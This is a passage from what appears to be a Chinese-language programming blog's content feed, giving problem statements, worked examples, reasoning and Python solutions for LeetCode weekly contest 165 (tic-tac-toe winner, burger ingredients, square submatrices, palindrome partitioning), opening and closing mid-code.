class="line"></span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> q:</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> range(len(q)):</span><br><span class="line">                current_state = q.popleft()</span><br><span class="line">                <span class="keyword">if</span> current_state == target:</span><br><span class="line">                    <span class="keyword">return</span> result</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> range(m):</span><br><span class="line">                    <span class="keyword">for</span> j <span class="keyword">in</span> range(n):</span><br><span class="line">                        current_copy = deepcopy(current_state)</span><br><span class="line">                        current_copy[i][j] = <span class="number">1</span>-current_copy[i][j]</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> <span class="number">0</span> &lt;= i<span class="number">-1</span> &lt;= m<span class="number">-1</span> <span class="keyword">and</span> <span class="number">0</span>&lt;= j &lt;= n<span class="number">-1</span>:</span><br><span class="line">                            current_copy[i<span class="number">-1</span>][j] = <span class="number">1</span>-current_copy[i<span class="number">-1</span>][j]</span><br><span class="line">                        <span class="keyword">if</span> <span class="number">0</span> &lt;= i+<span class="number">1</span> &lt;= m<span class="number">-1</span> <span class="keyword">and</span> <span class="number">0</span>&lt;= j &lt;= n<span class="number">-1</span>:</span><br><span class="line">                            current_copy[i+<span class="number">1</span>][j] = <span class="number">1</span>-current_copy[i+<span class="number">1</span>][j]</span><br><span class="line">                        <span class="keyword">if</span> <span class="number">0</span> &lt;= i &lt;= m<span class="number">-1</span> <span class="keyword">and</span> <span class="number">0</span> &lt;= j+<span class="number">1</span> &lt;= n<span class="number">-1</span>:</span><br><span class="line">                            current_copy[i][j+<span class="number">1</span>] = <span class="number">1</span>- current_copy[i][j+<span class="number">1</span>]</span><br><span class="line">                        <span class="keyword">if</span> <span class="number">0</span> &lt;= i &lt;= m<span class="number">-1</span> <span class="keyword">and</span> <span class="number">0</span> &lt;= j<span class="number">-1</span> &lt;= n<span class="number">-1</span>:</span><br><span class="line">                            current_copy[i][j<span class="number">-1</span>] = <span class="number">1</span>-current_copy[i][j<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">                        _str = str(current_copy)</span><br><span class="line">                        <span class="keyword">if</span> _str <span class="keyword">not</span> <span class="keyword">in</span> visited:</span><br><span class="line">                            visited.add(_str)</span><br><span class="line">                            q.append(current_copy)</span><br><span class="line">            result += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>LeetCode Competitions - 165</title>
      <link href="/2019/12/09/LeetCode-Competitions-165/"/>
      <content type="html"><![CDATA[<blockquote><p>全国排名为786/1659。在比赛中只解出了第一题。</p></blockquote><ul><li>[Solved] 表示在比赛中解出。</li><li>[Unsolved] 表示在比赛中未能解出。</li></ul><a id="more"></a><h2 id="Solved-1275-找出井字棋的获胜者"><a href="#Solved-1275-找出井字棋的获胜者" class="headerlink" title="[Solved] 1275.找出井字棋的获胜者"></a>[Solved] 1275.找出井字棋的获胜者</h2><h3 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h3><p>A 和 B 在一个 3 x 3 的网格上玩井字棋。</p><p>井字棋游戏的规则如下：</p><ul><li>玩家轮流将棋子放在空方格 (“ “) 上。</li><li>第一个玩家 A 总是用 “X” 作为棋子，而第二个玩家 B 总是用 “O” 作为棋子。</li><li>“X” 和 “O” 只能放在空方格中，而不能放在已经被占用的方格上。</li><li>只要有 3 个相同的（非空）棋子排成一条直线（行、列、对角线）时，游戏结束。</li><li>如果所有方块都放满棋子（不为空），游戏也会结束。</li><li>游戏结束后，棋子无法再进行任何移动。<br>给你一个数组 <code>moves</code>，其中每个元素是大小为 2 的另一个数组（元素分别对应网格的行和列），它按照 A 和 B 的行动顺序（先 A 后 B）记录了两人各自的棋子位置。</li></ul><p>如果游戏存在获胜者（A 或 B），就返回该游戏的获胜者；如果游戏以平局结束，则返回 “Draw”；如果仍会有行动（游戏未结束），则返回 “Pending”。</p><p>你可以假设 <code>moves</code> 都 有效（遵循井字棋规则），网格最初是空的，A 将先行动。</p><h3 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：moves = [[<span class="number">0</span>,<span class="number">0</span>],[<span class="number">2</span>,<span class="number">0</span>],[<span class="number">1</span>,<span class="number">1</span>],[<span class="number">2</span>,<span class="number">1</span>],[<span class="number">2</span>,<span class="number">2</span>]]</span><br><span class="line">输出：<span class="string">"A"</span></span><br><span class="line">解释：<span class="string">"A"</span> 获胜，他总是先走。</span><br><span class="line"><span class="string">"X  "</span>    <span class="string">"X  "</span>    <span class="string">"X  "</span>    <span class="string">"X  "</span>    <span class="string">"X  "</span></span><br><span class="line"><span class="string">"   "</span> -&gt; <span class="string">"   "</span> -&gt; <span class="string">" X "</span> -&gt; <span class="string">" X "</span> -&gt; <span class="string">" X "</span></span><br><span class="line"><span class="string">"   "</span>    <span class="string">"O  "</span>    <span class="string">"O  "</span>    <span class="string">"OO "</span>    <span class="string">"OOX"</span></span><br></pre></td></tr></table></figure><h3 id="示例2"><a href="#示例2" class="headerlink" title="示例2:"></a>示例2:</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：moves = [[<span class="number">0</span>,<span class="number">0</span>],[<span class="number">1</span>,<span class="number">1</span>],[<span class="number">0</span>,<span class="number">1</span>],[<span class="number">0</span>,<span class="number">2</span>],[<span class="number">1</span>,<span class="number">0</span>],[<span class="number">2</span>,<span class="number">0</span>]]</span><br><span class="line">输出：<span class="string">"B"</span></span><br><span class="line">解释：<span class="string">"B"</span> 获胜。</span><br><span class="line"><span class="string">"X  "</span>    <span class="string">"X  "</span>    <span class="string">"XX "</span>    <span class="string">"XXO"</span>    <span class="string">"XXO"</span>    <span class="string">"XXO"</span></span><br><span class="line"><span class="string">"   "</span> -&gt; <span class="string">" O "</span> -&gt; <span class="string">" O "</span> -&gt; <span class="string">" O "</span> -&gt; <span class="string">"XO "</span> -&gt; <span class="string">"XO "</span> </span><br><span class="line"><span class="string">"   "</span>    <span class="string">"   "</span>    <span class="string">"   "</span>    <span class="string">"   "</span>    <span class="string">"   "</span>    <span class="string">"O  "</span></span><br></pre></td></tr></table></figure><h3 id="示例3"><a href="#示例3" class="headerlink" title="示例3:"></a>示例3:</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：moves = [[<span class="number">0</span>,<span class="number">0</span>],[<span class="number">1</span>,<span class="number">1</span>],[<span class="number">2</span>,<span class="number">0</span>],[<span class="number">1</span>,<span class="number">0</span>],[<span class="number">1</span>,<span class="number">2</span>],[<span class="number">2</span>,<span class="number">1</span>],[<span class="number">0</span>,<span class="number">1</span>],[<span class="number">0</span>,<span class="number">2</span>],[<span class="number">2</span>,<span class="number">2</span>]]</span><br><span class="line">输出：<span class="string">"Draw"</span></span><br><span class="line">输出：由于没有办法再行动，游戏以平局结束。</span><br><span class="line"><span class="string">"XXO"</span></span><br><span class="line"><span class="string">"OOX"</span></span><br><span class="line"><span class="string">"XOX"</span></span><br></pre></td></tr></table></figure><h3 id="示例4"><a href="#示例4" class="headerlink" title="示例4:"></a>示例4:</h3><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：moves = <span class="string">[[0,0],[1,1]]</span></span><br><span class="line">输出：<span class="string">"Pending"</span></span><br><span class="line">解释：游戏还没有结束。</span><br><span class="line"><span class="string">"X  "</span></span><br><span class="line"><span class="string">" O "</span></span><br><span class="line"><span class="string">"   "</span></span><br></pre></td></tr></table></figure><h3 id="约束条件："><a href="#约束条件：" class="headerlink" title="约束条件："></a>约束条件：</h3><ul><li><code>1 &lt;= moves.length &lt;= 9</code></li><li><code>moves[i].length == 2</code></li><li><code>0 &lt;= moves[i][j] &lt;= 2</code></li><li><code>moves</code> 里没有重复的元素。</li><li><code>moves</code> 遵循井字棋的规则。</li></ul><h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><p>这个题目的难点在于怎么对四种结果进行判断。因为A胜和B胜两种结果对判断方法相同，所以从以下三种情况来说明。</p><ul><li>A（或B）胜：在行，列或对角线上三个棋子连成直线则获胜。由于棋盘固定为3 x 3，因此可以借助两个长度为3的数组<code>row, col</code>来统计A的棋子在每行每列的个数。若<code>row[i]==3</code>或<code>col[j]==3</code>，则A胜。同理，对于对角线棋子的判断，可以利用固定规则判断，即在A所下的棋子中，是否同时存在<code>[0,0],[1,1],[2,2]</code>（或<code>[0,2],[1,1],[2,0]</code>）。</li><li>当A和B均没有获胜，且<code>len(moves)==9</code>则结果为”Draw”。</li><li>排除以上三种情况，则游戏未结束，”Pending”。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Time complexity : O(N**2+N+3)*2 = O(N**2)</span></span><br><span class="line"><span class="comment"># Space complexity : O(2N+N**2/2) = O(N**2)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tictactoe</span><span class="params">(self, moves: List[List[int]])</span> -&gt; str:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">is_win</span><span class="params">(moves, player_start)</span>:</span></span><br><span class="line">            row = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">            col = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">            x_move = &#123;&#125;</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(player_start, len(moves), <span class="number">2</span>):</span><br><span class="line">                x_move[tuple(moves[i])] = <span class="number">1</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span> move <span class="keyword">in</span> x_move.keys():</span><br><span class="line">                row[move[<span class="number">0</span>]] += <span class="number">1</span></span><br><span class="line">                col[move[<span class="number">1</span>]] += <span class="number">1</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span> n, m <span class="keyword">in</span> zip(row, col):</span><br><span class="line">                <span class="keyword">if</span> n ==<span class="number">3</span> <span class="keyword">or</span> m == <span class="number">3</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (<span class="number">0</span>, <span class="number">0</span>) <span class="keyword">in</span> x_move <span class="keyword">and</span> (<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">in</span> x_move <span class="keyword">and</span> (<span class="number">2</span>,<span class="number">2</span>) <span class="keyword">in</span> x_move:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">            <span class="keyword">elif</span> (<span class="number">0</span>,<span class="number">2</span>) <span class="keyword">in</span> x_move <span class="keyword">and</span> (<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">in</span> x_move <span class="keyword">and</span> (<span class="number">2</span>,<span class="number">0</span>) <span class="keyword">in</span> x_move:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">        A_result = is_win(moves, <span class="number">0</span>)</span><br><span class="line">        B_result = is_win(moves, <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> A_result:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"A"</span></span><br><span class="line">        <span class="keyword">elif</span> B_result:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"B"</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> A_result <span class="keyword">and</span> <span class="keyword">not</span> B_result <span class="keyword">and</span> len(moves) == <span class="number">9</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Draw"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Pending"</span></span><br></pre></td></tr></table></figure><h2 id="Unsolved-1276-不浪费原料的汉堡制作方案"><a href="#Unsolved-1276-不浪费原料的汉堡制作方案" class="headerlink" title="[Unsolved] 1276. 不浪费原料的汉堡制作方案"></a>[Unsolved] 1276. 不浪费原料的汉堡制作方案</h2><h3 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h3><p>圣诞活动预热开始啦，汉堡店推出了全新的汉堡套餐。为了避免浪费原料，请你帮他们制定合适的制作计划。</p><p>给你两个整数 <code>tomatoSlices</code> 和 <code>cheeseSlices</code>，分别表示番茄片和奶酪片的数目。不同汉堡的原料搭配如下：</p><p>巨无霸汉堡：4 片番茄和 1 片奶酪<br>小皇堡：2 片番茄和 1 片奶酪<br>请你以 <code>[total_jumbo, total_small]</code>（[巨无霸汉堡总数，小皇堡总数]）的格式返回恰当的制作方案，使得剩下的番茄片 <code>tomatoSlices</code> 和奶酪片 <code>cheeseSlices</code> 的数量都是 0。</p><p>如果无法使剩下的番茄片 <code>tomatoSlices</code> 和奶酪片 <code>cheeseSlices</code> 的数量为 0，就请返回 []。</p><h3 id="示例1-1"><a href="#示例1-1" class="headerlink" title="示例1:"></a>示例1:</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：tomatoSlices = <span class="number">16</span>, cheeseSlices = <span class="number">7</span></span><br><span class="line">输出：[<span class="number">1</span>,<span class="number">6</span>]</span><br><span class="line">解释：制作 <span class="number">1</span> 个巨无霸汉堡和 <span class="number">6</span> 个小皇堡需要 <span class="number">4</span>*<span class="number">1</span> + <span class="number">2</span>*<span class="number">6</span> = <span class="number">16</span> 片番茄和 <span class="number">1</span> + <span class="number">6</span> = <span class="number">7</span> 片奶酪。不会剩下原料。</span><br></pre></td></tr></table></figure><h3 id="示例2-1"><a href="#示例2-1" class="headerlink" title="示例2:"></a>示例2:</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：tomatoSlices = <span class="number">17</span>, cheeseSlices = <span class="number">4</span></span><br><span class="line">输出：[]</span><br><span class="line">解释：只制作小皇堡和巨无霸汉堡无法用光全部原料。</span><br></pre></td></tr></table></figure><h3 id="示例3-1"><a href="#示例3-1" class="headerlink" title="示例3:"></a>示例3:</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：tomatoSlices = <span class="number">4</span>, cheeseSlices = <span class="number">17</span></span><br><span class="line">输出：[]</span><br><span class="line">解释：制作 <span class="number">1</span> 个巨无霸汉堡会剩下 <span class="number">16</span> 片奶酪，制作 <span class="number">2</span> 个小皇堡会剩下 <span class="number">15</span> 片奶酪。</span><br></pre></td></tr></table></figure><h3 id="示例4-1"><a href="#示例4-1" class="headerlink" title="示例4:"></a>示例4:</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：tomatoSlices = <span class="number">0</span>, cheeseSlices = <span class="number">0</span></span><br><span class="line">输出：[<span class="number">0</span>,<span class="number">0</span>]</span><br></pre></td></tr></table></figure><h3 id="示例5"><a href="#示例5" class="headerlink" title="示例5:"></a>示例5:</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：tomatoSlices = <span class="number">2</span>, cheeseSlices = <span class="number">1</span></span><br><span class="line">输出：[<span class="number">0</span>,<span class="number">1</span>]</span><br></pre></td></tr></table></figure><h3 id="约束条件：-1"><a href="#约束条件：-1" class="headerlink" title="约束条件："></a>约束条件：</h3><ul><li><code>0 &lt;= tomatoSlices &lt;= 10^7</code></li><li><code>0 &lt;= cheeseSlices &lt;= 10^7</code></li></ul><h3 id="解题思路：-1"><a href="#解题思路：-1" class="headerlink" title="解题思路："></a>解题思路：</h3><p>当时看到这道题的第一反应是线性规划，但是想到线性规划不好求解。就是着用动态规划，结果在表格上纠结了半天也没写出合适的状态转移方程。看到题解是直接求解二元一次方程的时候我就傻了，还是练的不够多。</p><p>设巨无霸有x个，皇堡有y个。可以得到下面的二元一次方程组：</p><p><code>4x + 2y = tomatoSlices</code></p><p><code>x + y = cheeseSlices</code></p><p>解得：</p><p><code>x = 0.5 * tomatoSlices - cheeseSlices</code></p><p><code>y = 2 * cheeseSlices - 0.5 * tomatoSlices</code></p><p>根据题意，<code>x, y &gt; 0 and x, y为整数</code>，有以下约束条件：</p><ul><li><code>tomatoSlices</code> 为偶数</li><li><code>tomatoSlices &gt;= 2 * cheeseSlices</code></li><li><code>4 * cheeseSlices &gt;= tomatoSlices</code></li></ul><p>不满足则无解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Time Complexity : O(1)</span></span><br><span class="line"><span class="comment"># Space Complexity : O(1)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">numOfBurgers</span><span class="params">(self, tomatoSlices: int, cheeseSlices: int)</span> -&gt; List[int]:</span></span><br><span class="line">        <span class="keyword">if</span> tomatoSlices &amp; <span class="number">1</span> != <span class="number">0</span> <span class="keyword">or</span> tomatoSlices &lt; <span class="number">2</span>*cheeseSlices <span class="keyword">or</span> <span class="number">4</span>*cheeseSlices &lt; tomatoSlices:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> [tomatoSlices // <span class="number">2</span> - cheeseSlices, <span class="number">2</span>*cheeseSlices - tomatoSlices//<span class="number">2</span>]</span><br></pre></td></tr></table></figure><h2 id="Unsolved-1277-统计全为1的正方形子矩阵"><a href="#Unsolved-1277-统计全为1的正方形子矩阵" class="headerlink" title="[Unsolved] 1277.统计全为1的正方形子矩阵"></a>[Unsolved] 1277.统计全为1的正方形子矩阵</h2><h3 id="题目描述：-2"><a href="#题目描述：-2" class="headerlink" title="题目描述："></a>题目描述：</h3><p>给你一个 <code>m * n</code> 的矩阵，矩阵中的元素不是 <code>0</code> 就是 <code>1</code>，请你统计并返回其中完全由 <code>1</code> 组成的 <code>正方形</code>子矩阵的个数。</p><h3 id="示例1-2"><a href="#示例1-2" class="headerlink" title="示例1:"></a>示例1:</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">输入：matrix =</span><br><span class="line">[</span><br><span class="line">  [<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">  [<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">  [<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>]</span><br><span class="line">]</span><br><span class="line">输出：<span class="number">15</span></span><br><span class="line">解释： </span><br><span class="line">边长为 <span class="number">1</span> 的正方形有 <span class="number">10</span> 个。</span><br><span class="line">边长为 <span class="number">2</span> 的正方形有 <span class="number">4</span> 个。</span><br><span class="line">边长为 <span class="number">3</span> 的正方形有 <span class="number">1</span> 个。</span><br><span class="line">正方形的总数 = <span class="number">10</span> + <span class="number">4</span> + <span class="number">1</span> = <span class="number">15.</span></span><br></pre></td></tr></table></figure><h3 id="示例2-2"><a href="#示例2-2" class="headerlink" title="示例2:"></a>示例2:</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">输入：matrix = </span><br><span class="line">[</span><br><span class="line">  [<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>],</span><br><span class="line">  [<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>],</span><br><span class="line">  [<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>]</span><br><span class="line">]</span><br><span class="line">输出：<span class="number">7</span></span><br><span class="line">解释：</span><br><span class="line">边长为 <span class="number">1</span> 的正方形有 <span class="number">6</span> 个。 </span><br><span class="line">边长为 <span class="number">2</span> 的正方形有 <span class="number">1</span> 个。</span><br><span class="line">正方形的总数 = <span class="number">6</span> + <span class="number">1</span> = <span class="number">7.</span></span><br></pre></td></tr></table></figure><h3 id="约束条件：-2"><a href="#约束条件：-2" class="headerlink" title="约束条件："></a>约束条件：</h3><ul><li><code>1 &lt;= arr.length &lt;= 300</code></li><li><code>1 &lt;= arr[0].length &lt;= 300</code></li><li><code>0 &lt;= arr[i][j] &lt;= 1</code></li></ul><h3 id="解题思路：-2"><a href="#解题思路：-2" class="headerlink" title="解题思路："></a>解题思路：</h3><p>参考<a href="https://leetcode-cn.com/problems/count-square-submatrices-with-all-ones/solution/tong-ji-quan-wei-1-de-zheng-fang-xing-zi-ju-zhen-b/" target="_blank" rel="noopener">官方解答</a>，该题目与<a href="https://leetcode-cn.com/problems/maximal-square/" target="_blank" rel="noopener">221.最大正方形</a>相似，解题方法也类似。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">countSquares</span><span class="params">(self, matrix)</span>:</span></span><br><span class="line">        cols = len(matrix[<span class="number">0</span>])</span><br><span class="line">        rows = len(matrix)</span><br><span class="line">        dp = [[<span class="number">0</span>] * cols <span class="keyword">for</span> _ <span class="keyword">in</span> range(rows)]</span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(rows):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(cols):</span><br><span class="line">                <span class="keyword">if</span> i == <span class="number">0</span> <span class="keyword">or</span> j == <span class="number">0</span>:</span><br><span class="line">                    dp[i][j] = matrix[i][j]</span><br><span class="line">                <span class="keyword">elif</span> matrix[i][j] == <span class="number">0</span>:</span><br><span class="line">                    dp[i][j] = <span class="number">0</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    dp[i][j] = min([dp[i<span class="number">-1</span>][j], dp[i][j<span class="number">-1</span>], dp[i<span class="number">-1</span>][j<span class="number">-1</span>]]) + <span class="number">1</span></span><br><span class="line">                result += dp[i][j]</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><h2 id="Unsolved-1278-分割回文串-III"><a href="#Unsolved-1278-分割回文串-III" class="headerlink" title="[Unsolved] 1278.分割回文串 III"></a>[Unsolved] 1278.分割回文串 III</h2><h3 id="题目描述：-3"><a href="#题目描述：-3" class="headerlink" title="题目描述："></a>题目描述：</h3><p>给你一个由小写字母组成的字符串 <code>s</code>，和一个整数 <code>k</code>。</p><p>请你按下面的要求分割字符串：</p><ul><li>首先，你可以将 <code>s</code> 中的部分字符修改为其他的小写英文字母。</li><li>接着，你需要把 <code>s</code> 分割成 <code>k</code> 个非空且不相交的子串，并且每个子串都是回文串。</li></ul><p>请返回以这种方式分割字符串所需修改的最少字符数。</p><h3 id="示例1-3"><a href="#示例1-3" class="headerlink" title="示例1:"></a>示例1:</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：s = <span class="string">"abc"</span>, k = <span class="number">2</span></span><br><span class="line">输出：<span class="number">1</span></span><br><span class="line">解释：你可以把字符串分割成 <span class="string">"ab"</span> 和 <span class="string">"c"</span>，并修改 <span class="string">"ab"</span> 中的 <span class="number">1</span> 个字符，将它变成回文串。</span><br></pre></td></tr></table></figure><h3 id="示例2-3"><a href="#示例2-3" class="headerlink" title="示例2:"></a>示例2:</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：s = <span class="string">"aabbc"</span>, k = <span class="number">3</span></span><br><span class="line">输出：<span class="number">0</span></span><br><span class="line">解释：你可以把字符串分割成 <span class="string">"aa"</span>、<span class="string">"bb"</span> 和 <span class="string">"c"</span>，它们都是回文串。</span><br></pre></td></tr></table></figure><h3 id="示例3-2"><a href="#示例3-2" class="headerlink" title="示例3:"></a>示例3:</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：s = <span class="string">"leetcode"</span>, k = <span class="number">8</span></span><br><span class="line">输出：<span class="number">0</span></span><br></pre></td></tr></table></figure><h3 id="约束条件：-3"><a href="#约束条件：-3" class="headerlink" title="约束条件："></a>约束条件：</h3><ul><li><code>1 &lt;= k &lt;= s.length &lt;= 100</code></li><li><code>s</code> 中只含有小写英文字母。</li></ul><h3 id="解题思路：-3"><a href="#解题思路：-3" class="headerlink" title="解题思路："></a>解题思路：</h3><p>参考<a href="https://leetcode-cn.com/problems/palindrome-partitioning-iii/solution/fen-ge-hui-wen-chuan-iii-by-leetcode/" target="_blank" rel="noopener">官方题解</a>。在考虑字符串的动态规划问题时（特别时分割和拼接的问题），注意是否需要对字符串进行重复的枚举。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">palindromePartition</span><span class="params">(self, s, k)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">cost</span><span class="params">(l, r)</span>:</span></span><br><span class="line">            changes = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span> l &lt; r:</span><br><span class="line">                changes += (<span class="number">0</span> <span class="keyword">if</span> s[l<span class="number">-1</span>]==s[r<span class="number">-1</span>] <span class="keyword">else</span> <span class="number">1</span>)</span><br><span class="line">                l += <span class="number">1</span></span><br><span class="line">                r -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> changes</span><br><span class="line"></span><br><span class="line">        n = len(s)</span><br><span class="line">        dp = [[<span class="number">10</span>**<span class="number">8</span>] * (k+<span class="number">1</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> range(n+<span class="number">1</span>)]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, n+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, min(i, k)+<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> j == <span class="number">1</span>:</span><br><span class="line">                    dp[i][j] 